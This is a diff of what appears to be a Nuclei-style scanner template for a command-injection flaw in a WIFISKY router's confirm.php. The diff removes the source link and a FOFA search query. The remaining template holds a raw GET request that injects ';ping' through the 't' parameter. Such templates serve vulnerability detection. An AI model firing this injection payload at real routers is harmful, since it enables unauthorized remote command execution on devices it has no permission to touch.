@@ -3,12 +3,8 @@ info:
   name: WIFISKY-7层流控路由器 confirm.php RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mai0z99whc9o7ugq'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mai0z99whc9o7ugq
-    fofa: title="WIFISKY 7层流控路由器"
 http:
 - raw:
   - 'GET /notice/confirm.php?t=;ping%20www.baidu.com HTTP/1.1
